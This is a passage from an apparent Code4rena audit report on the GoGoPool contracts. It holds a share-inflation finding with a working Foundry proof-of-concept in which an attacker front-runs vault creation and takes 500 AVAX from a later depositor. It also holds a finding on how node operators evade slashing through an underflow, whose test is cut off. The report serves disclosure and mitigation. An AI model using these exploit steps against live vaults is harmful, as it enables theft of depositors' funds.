href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/39\">yongskiws</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/37\">SEVEN</a>, and <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/14\">dic0de</a></em></p>\n<p>Inflation of <code>ggAVAX</code> share price can be done by depositing as soon as the vault is created.</p>\n<p>Impact:</p>\n<ol>\n<li>Early depositor will be able steal other depositors funds</li>\n<li>Exchange rate is inflated. As a result depositors are not able to deposit small funds.</li>\n</ol>\n<h3 id=\"proof-of-concept-4\" style=\"position:relative;\"><a href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>If <code>ggAVAX</code> is not seeded as soon as it is created, a malicious depositor can deposit 1 WEI of AVAX to receive 1 share.<br>\nThe depositor can donate WAVAX to the vault and call <code>syncRewards</code>. This will start inflating the price.</p>\n<p>When the attacker front-runs the creation of the vault, the attacker:</p>\n<ol>\n<li>Calls <code>depositAVAX</code> to receive 1 share</li>\n<li>Transfers <code>WAVAX</code> to <code>ggAVAX</code></li>\n<li>Calls <code>syncRewards</code> to inflate exchange rate</li>\n</ol>\n<p>The issue exists because the exchange rate is calculated as the ratio between the <code>totalSupply</code> of shares and the <code>totalAssets()</code>.<br>\nWhen the attacker transfers <code>WAVAX</code> and calls <code>syncRewards()</code>, the <code>totalAssets()</code> increases gradually and therefore the exchange rate also increases.</p>\n<p><code>convertToShares</code>: <a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L123\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L123</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">\tfunction convertToShares(uint256 assets) public view virtual returns (uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\treturn supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t}</span></span></code></pre>\n<p>Its important to note that while it is true that cycle length is 14 days, in practice time between cycles can very between 0-14 days.\nThis is because syncRewards validates that the next reward cycle is evenly divided by the length (14 days).</p>\n<p><code>syncRewards</code>: <a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L102\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L102</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">\tfunction syncRewards() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">----------</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Ensure nextRewardsCycleEnd will be evenly divisible by `rewardsCycleLength`.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint32 nextRewardsCycleEnd = ((timestamp + rewardsCycleLength) / rewardsCycleLength) * rewardsCycleLength;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">---------</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t}</span></span></code></pre>\n<p>Therefore:</p>\n<ul>\n<li>The closer the call to <code>syncRewards</code> is to the next evenly divisible value of <code>rewardsCycleLength</code>, the closer the next  <code>rewardsCycleEnd</code> will be.</li>\n<li>The closer the delta between <code>syncRewards</code> calls is, the higher revenue the attacker will get.</li>\n</ul>\n<p>Edge case example:<br>\n<code>syncRewards</code> is called with the timestamp 1672876799, <code>syncRewards</code> will be able to be called again 1 second later.\n<code>(1672876799 + 14 days) / 14 days) * 14 days) = 1672876800</code></p>\n<p>Additionally, the price inflation causes a revert for users who want to deposit less then the donation (WAVAX transfer) amount, due to precision rounding when depositing.</p>\n<p><code>depositAVAX</code>: <a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L166\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L166</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"16\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">\tfunction depositAVAX() public payable returns (uint256 shares) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">------</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tif ((shares = previewDeposit(assets)) == 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\trevert ZeroShares();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">------</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t}</span></span></code></pre>\n<p><code>previewDeposit</code> and <code>convertToShares</code>:<br>\n<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L133\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L133</a><br>\n<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L123\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L123</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">\tfunction convertToShares(uint256 assets) public view virtual returns (uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\treturn supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tfunction previewDeposit(uint256 assets) public view virtual returns (uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\treturn convertToShares(assets);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t}</span></span></code></pre>\n<p><strong>Foundry POC</strong></p>\n<p>The POC will demonstrate the below scenario:</p>\n<ol>\n<li>Bob front-runs the vault creation.</li>\n<li>Bob deposits 1 WEI of AVAX to the vault.</li>\n<li>Bob transfers 1000 WAVAX to the vault.</li>\n<li>Bob calls <code>syncRewards</code> when block.timestamp = <code>1672876799</code>.</li>\n<li>Bob waits 1 second.</li>\n<li>Bob calls <code>syncRewards</code> again. Share price fully inflated.</li>\n<li>Alice deposits 2000 AVAX to vault.</li>\n<li>Bob withdraws 1500 AVAX (steals 500 AVAX from Alice).</li>\n<li>Alice share earns her 1500 AVAX (although she deposited 2000).</li>\n</ol>\n<p>Additionally, the POC will show that depositors trying to deposit less then the donation amount will revert.</p>\n<p>Add the following test to <code>TokenggAVAX.t.sol</code>: <a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/test/unit/TokenggAVAX.t.sol#L108\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/test/unit/TokenggAVAX.t.sol#L108</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">\tfunction testShareInflation() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 depositAmount = 1;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 aliceDeposit = 2000 ether;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 donationAmount = 1000 ether;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tvm.deal(bob, donationAmount  + depositAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tvm.deal(alice, aliceDeposit);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tvm.warp(1672876799);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// create new ggAVAX</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tggAVAXImpl = new TokenggAVAX();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tggAVAX = TokenggAVAX(deployProxy(address(ggAVAXImpl), address(guardian)));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tggAVAX.initialize(store, ERC20(address(wavax)));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Bob deposits 1 WEI of AVAX</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tvm.prank(bob);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tggAVAX.depositAVAX{value: depositAmount}();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Bob transfers 1000 AVAX to vault</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tvm.startPrank(bob);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\twavax.deposit{value: donationAmount}();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\twavax.transfer(address(ggAVAX), donationAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tvm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Bob Syncs rewards</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tggAVAX.syncRewards();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// 1 second has passed</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// This can range between 0-14 days. Every seconds, exchange rate rises</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tskip(1 seconds);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Alice deposits 2000 AVAX</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tvm.prank(alice);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tggAVAX.depositAVAX{value: aliceDeposit}();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t//Expectet revert when any depositor deposits less then 1000 AVAX</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tvm.expectRevert(bytes4(keccak256(&quot;ZeroShares()&quot;)));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tggAVAX.depositAVAX{value: 10 ether}();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Bob withdraws maximum assests for his share</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 maxWithdrawAssets = ggAVAX.maxWithdraw(bob);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tvm.prank(bob);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tggAVAX.withdrawAVAX(maxWithdrawAssets);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t//Validate bob has withdrawn 1500 AVAX </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tassertEq(bob.balance, 1500 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Alice withdraws maximum assests for her share</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tmaxWithdrawAssets = ggAVAX.maxWithdraw(alice);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tggAVAX.syncRewards(); // to update accounting</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tvm.prank(alice);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tggAVAX.withdrawAVAX(maxWithdrawAssets);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Validate that Alice withdraw 1500 AVAX + 1 (~500 AVAX loss)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tassertEq(alice.balance, 1500 ether + 1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t}</span></span></code></pre>\n<p>To run the POC, execute:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">forge test -m testShareInflation -v</span></span></code></pre>\n<p>Expected output:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Running 1 test for test/unit/TokenggAVAX.t.sol:TokenggAVAXTest</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">[PASS] testShareInflation() (gas: 3874399)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Test result: ok. 1 passed; 0 failed; finished in 8.71s</span></span></code></pre>\n<h3 id=\"tools-used-2\" style=\"position:relative;\"><a href=\"#tools-used-2\" aria-label=\"tools used 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code, Foundry</p>\n<h3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>When creating the vault add initial funds in order to make it harder to inflate the price.\nBest practice would add initial funds as part of the initialization of the contract (to prevent front-running).</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/209#issuecomment-1379257413\">emersoncloud (GoGoPool) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/209#issuecomment-1407738455\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how, by performing a small deposit, followed by a transfer, shares can be rebased, causing a grief in the best case, and complete fund loss in the worst case for every subsequent depositor.</p>\n<p>While the finding is fairly known, it’s impact should not be understated, and because of this I agree with High Severity.</p>\n<p>I recommend watching this presentation by Riley Holterhus which shows possible mitigations for the attack:\n<a href=\"https://youtu.be/_pO2jDgL0XE?t=601\">https://youtu.be/_pO2jDgL0XE?t=601</a></p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed\">emersoncloud (GoGoPool) mitigated</a>:</strong></p>\n<blockquote>\n<p>Initialize ggAVAX with a deposit: <a href=\"https://github.com/multisig-labs/gogopool/pull/49\">multisig-labs/gogopool#49</a></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed by <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/5\">RaymondFam</a> and <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/24\">hansfriese</a>.</p>\n<hr>\n<h2 id=\"h-06-minipoolmanager-node-operator-can-avoid-being-slashed\" style=\"position:relative;\"><a href=\"#h-06-minipoolmanager-node-operator-can-avoid-being-slashed\" aria-label=\"h 06 minipoolmanager node operator can avoid being slashed permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/136\">[H-06] MinipoolManager: node operator can avoid being slashed</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/136\">HollaDieWaldfee</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/743\">enckrish</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/709\">imare</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/525\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/321\">danyams</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/221\">0xdeadbeef0x</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/186\">cozzetti</a>, and <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/128\">ladboy233</a></em></p>\n<p>When staking is done, a Rialto multisig calls <code>MinipoolManager.recordStakingEnd</code> (<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L385-L440\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L385-L440</a>).</p>\n<p>If the <code>avaxTotalRewardAmt</code> has the value zero, the <code>MinipoolManager</code> will slash the node operator’s GGP.</p>\n<p>The issue is that the amount to slash can be greater than the GGP balance the node operator has staked.</p>\n<p>This will cause the call to <code>MinipoolManager.recordStakingEnd</code> to revert because an underflow is detected.</p>\n<p>This means a node operator can create a minipool that cannot be slashed.</p>\n<p>A node operator must provide at least 10% of <code>avaxAssigned</code> as collateral by staking GGP.</p>\n<p>It is assumed that a node operator earns AVAX at a rate of 10% per year.</p>\n<p>So if a Minipool is created with a duration of <code>> 365 days</code>, the 10% collateral is not sufficient to pay the expected rewards.</p>\n<p>This causes the function call to revert.</p>\n<p>Another cause of the revert can be that the GGP price in AVAX changes. Specifically if the GGP price falls, there needs to be slashed more GGP.</p>\n<p>Therefore if the GGP price drops enough it can cause the call to slash to revert.</p>\n<p>I think it is important to say that with any collateralization ratio this can happen. The price of GGP must just drop enough or one must use a long enough duration.</p>\n<p>The exact impact of this also depends on how the Rialto multisig handles failed calls to <code>MinipoolManager.recordStakingEnd</code>.</p>\n<p>It looks like if this happens, <code>MinipoolManager.recordStakingError</code> (<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L484-L515\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L484-L515</a>) is called.</p>\n<p>This allows the node operator to withdraw his GGP stake.</p>\n<p><strong>So in summary a node operator can create a Minipool that cannot be slashed and probably remove his GGP stake when it should have been slashed.</strong></p>\n<h3 id=\"proof-of-concept-5\" style=\"position:relative;\"><a href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>When calling <code>MinipoolManager.recordStakingEnd</code> (<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L385-L440\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L385-L440</a>) and the <code>avaxTotalRewardAmt</code> parameter is zero, the node operator is slashed:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"21\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// No rewards means validation period failed, must slash node ops GGP.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">avaxTotalRewardAmt</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">slash</span><span class=\"mtk1\">(</span><span class=\"mtk12\">minipoolIndex</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>The <code>MinipoolManager.slash</code> function (<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L670-L683\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L670-L683</a>) then calculates <code>expectedAVAXRewardsAmt</code> and from this <code>slashGGPAmt</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"22\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">avaxLiquidStakerAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;minipool.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">index</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.avaxLiquidStakerAmt&quot;</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">expectedAVAXRewardsAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getExpectedAVAXRewardsAmt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">duration</span><span class=\"mtk1\">, </span><span class=\"mtk12\">avaxLiquidStakerAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">slashGGPAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">calculateGGPSlashAmt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">expectedAVAXRewardsAmt</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Downstream there is then a revert due to underflow because of the following line in <code>Staking.decreaseGGPStake</code> (<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Staking.sol#L94-L97\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Staking.sol#L94-L97</a>):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"23\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">subUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;staker.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">stakerIndex</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.ggpStaked&quot;</span><span class=\"mtk1\">)), </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>You can add the following foundry test to <code>MinipoolManager.t.sol</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"24\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testRecordStakingEndWithSlashFail</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">duration</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">366</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span 